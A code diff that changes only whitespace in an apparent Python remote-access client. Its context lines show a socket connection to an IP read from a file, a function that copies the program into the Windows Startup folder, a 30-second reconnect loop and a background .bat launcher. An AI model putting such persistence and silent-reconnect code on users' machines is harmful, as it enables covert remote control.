@@ -17,7 +17,6 @@ with open(path, "r") as archivo:
 
 print(data_ip)
 
-
 cliente_socket = ClienteSocket(data_ip["ip"])
 print('cliente_sockey', cliente_socket)
 
@@ -25,7 +24,6 @@ global salida
 salida = False
 
 username = getpass.getuser()
-
 
 def add_to_startup(file_path):
     startup_folder = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
@@ -207,7 +205,6 @@ def realizar_conexion():
         print('Intentando reconexión en 30 segundos...')
         time.sleep(30)
         realizar_conexion()
-
 
 # Ruta completa hacia el archivo .bat
 bat_file_path = "C:\\Cliente\\iniciar_en_segundo_plano.bat"
